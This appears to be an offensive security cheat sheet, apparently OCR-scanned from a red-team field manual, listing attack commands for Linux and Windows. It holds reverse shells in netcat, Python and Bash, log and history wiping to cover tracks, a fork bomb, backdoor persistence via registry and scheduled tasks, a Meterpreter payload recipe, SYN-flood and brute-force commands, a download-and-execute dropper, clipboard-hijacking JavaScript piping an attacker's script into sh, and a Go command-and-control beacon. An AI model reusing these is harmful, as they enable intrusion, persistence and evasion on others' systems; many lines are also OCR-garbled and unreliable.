# Linux System Enumeration / Post Exploitation

```
id
w
who -a
last -a
ps -ef
df -h
uname -a
mount
cat /etc/issue
cat /etc/release
cat /proc/version
```

# Linux Miscellaneous Commands / Covering Tracks

```
chattr (+/-)i file
unset HISTFILE
unset HISTFILESIZE
unset HISTSIZE
echo "" /var/log/auth.log 
echo '''' -/.bash history
kill -9 $$
ln /dev/null -/.bash_historj -sf
```

# Fork Bomb

```
: (){:I: &I;:
```

# TCPDump

```
tcpdump -i ethO -XX -w out.pcap
tcpdump -i ethO port XX dst X.X.X.X
```

# Windows System Enumeration

```
ver
sc query state=all
tasklist /svc
tasklist /m
tasklist /S ip /v
taskkill /PID pid /F
systeminfo /S ip /U domain\user /P Pwd
dir /a /s /b c:\'.pdf'
dir /a /b c:\windows\kb'
findstr /si password' .txt I •.xmll •.xls tree /F /A c:\ tree.txt
reg save HKLl~\Security security.hive echo %USERNAl~E%
```

# Start RDP

```
reg add "HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
(Tunnel RDP through port 443) REG ADD "HKLt1\System\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
```

# PowerShell Enumeration

```
Get-WmiObject -class win32 operatingsjstem I select -property 1 csv c:\os.txt
Get-Service I where object {$ .status -eq ''Running''}
(new-object sjstem.net.webclient) .downloadFile(''url'',''dest'')
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential( 11 title ", 11 message 11 1 11 user" 11 domain")
powershell.exe Send-l-1ai1Hessage -to " email " -from " email " -subject "Subject11 -a " attachment file path " -body "Body" -SmtpServer Target Email Server IP
```

# PowerShell Launching Meterpreter Payload

1. ./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=l.l.l.l LPORT=443 audit.psl
2. Move audit.psl into same folder as encodeMeterpreter.psl
3. Launch Powershell (x86)
4. powershell.exe -executionpolicy bypass encodeMeterpreter.psl
5. Copy the encoded Meterpreter string

# Windows User Lockout

```
@echo T est run:
for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN- 1234\c$ /USER:%%U wrongpass
```

# Windows DHCP Exhaustion

```
for /L %i in (2,1,254) do (netsh interface ip set address local static
1.1.1.%i netrnask gw I~ %1 ping 12-.0.0.1 -n l -w 10000 nul %1)
```

# Rolling Reboot

```
for /L %i in (2,1,254) do shutdown /r /m \\l.l.l.%i /f /t 0 /c "Reboot
message''
```

# TTL Fingerprinting

```
Windows : 128 
Linux : 64 
Network : 255 
Solaris : 255
```

# Cisco IOS 11.2 - 12.2 Vulnerability

```
http:// ip /level/ 16-99 /exec/show/config
```

# FTP Through Non-Interactive Shell

```
echo open ip 21 ftp.txt
echo user
echo pass
echo bin
echo GET file =tp.txt echo bfe ftp.txt
ftp -s:ftp.txt
```

# NetCat Listeners

```
nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell 
nc 10.0.0.1 1234 -e cmd.exe Windows reverse shell
```

# Python Reverse Shell

```
python -c 'import socket,subprocess,os; s=socket.socket(socket..;;F_INET, socket.SOCK_STREAL1); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0); os.dup2(s.fileno(l,1); os.dup2(s.file:oo(),2);
p~subprocess.call( 1"/bin/sh","-i"] I;'
```

# Bash Reverse Shell

```
bash -i & /dev/tcp/10.0.0.1/8080 0 &1
```

# Windows Persistence

```
1. REG add HKEY CURRENT USER\Software\l1icrosoft\W indows\CurrentV ersion\Run /v firewall 7t REG SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:t1,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEt1" /SC l1INUTE /t10 45 /TN FIREWALL /TR
"%USERPROFILE%\backdoor.exe" /ED 12/12/2012
```

# HPING3 DoS

```
hping3 targetiP --flood --frag --spoof ip --destport # --syn
```

# Hydra Online Brute Force

```
hydra -1 ftp -P words -v targetiP ftp
```

# Download HTTP File and Execute

```
#!/usr/bin/python import urllib2, os
urls = [11 1.1.1.1'',"2.2.2.2"] port = 11 80"
payload = "cb.sh"
for url in urls:
u = "http://%s:%s/%s" % (url, port, payload) try:
r = urllib2.urlopen(u)
wfile = open{"/tmp/cb.sh", "wb") wfile.write(r.read()) wfile.close ()
break
except: continue
if os.path.exists("/tmp/cb.sh"): os.system("chmod -oo /tmp/cb.sh") os. system ("/tmp/cb. sh")
```

# Hashcat 

```
DICTIONARY ATTACK
hashcat -a 0 -m #type hash.txt
DICTIONARY + RULES ATTACK
hashcat -a 0 -m #type hash.txt
COMBINATION ATTACK
hashcat -a 1 -m #type hash.txt
MASK ATTACK
hashcat -a 3 -m #type hash.txt
HYBRID DICTIONARY + MASK
hashcat -a 6 -m #type hash.txt
HYBRID MASK + DICTIONARY
hashcat -a 7 -m #type hash.txt
dict.txt
dict.txt -r rule.txt
dict1.txt dict2.txt
?a?a?a?a?a?a
dict.txt ?a?a?a?a
?a?a?a?a dict.txt
```

# Malicious Javascript

```
<script>
document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\n'); e.preventDefault(); });
 </script>
 ```
# Execute Fileless Scripts in Golang

```
package main

import (
    "io/ioutil"
    "net/http"
    "os/exec"
    "time"
)

func main() {
    for {
        url := "http://my_command_control:8080/executeThisScript" // Download your bash script
        resp, _ := http.Get(string(url))
        defer resp.Body.Close()

        shellScriptBody, _ := ioutil.ReadAll(resp.Body) // keep in memory

        cmd := exec.Command("/bin/bash", "-c", string(shellScriptBody))
        cmd.Start()                                                     // run in background

        time.Sleep(5000) // wait for the next beaconing
    }
}
```

# Enumerating IPs with IPInfo

```curl ipinfo.io/54.90.107.240```

```
{
  "ip": "54.90.107.240",
  "hostname": "ec2-54-90-107-240.compute-1.amazonaws.com",
  "city": "Virginia Beach",
  "region": "Virginia",
  "country": "US",
  "loc": "36.8512,-76.1692",
  "org": "AS14618 Amazon.com, Inc.",
  "postal": "23465",
  "readme": "https://ipinfo.io/missingauth"
}
```

# Email Recon

```curl emailrep.io/john.smith@gmail.com```

```
{
  "email": "john.smith@gmail.com",
  "reputation": "high",
  "suspicious": false,
  "references": 91,
  "details": {
    "blacklisted": false,
    "malicious_activity": false,
    "malicious_activity_recent": false,
    "credentials_leaked": true,
    "credentials_leaked_recent": false,
    "data_breach": true,
    "last_seen": "07/27/2019",
    "domain_exists": true,
    "domain_reputation": "n/a",
    "new_domain": false,
    "days_since_domain_creation": 8773,
    "suspicious_tld": false,
    "spam": false,
    "free_provider": true,
    "disposable": false,
    "deliverable": true,
    "accept_all": false,
    "valid_mx": true,
    "spoofable": true,
    "spf_strict": true,
    "dmarc_enforced": false,
    "profiles": [
      "lastfm",
      "pinterest",
      "foursquare",
      "aboutme",
      "spotify",
      "twitter",
      "vimeo"
    ]
  }
}
```